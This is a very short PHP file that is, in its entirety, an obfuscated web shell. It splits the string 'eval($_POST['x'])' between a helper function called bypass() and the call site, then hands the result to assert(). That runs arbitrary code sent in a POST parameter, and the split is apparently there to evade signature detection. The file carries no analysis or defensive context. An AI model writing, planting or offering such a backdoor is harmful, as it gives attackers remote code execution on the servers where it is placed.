<?php
function bypass(){
    return "l(\$_POST['";
}
assert("eva".bypass()."x']);");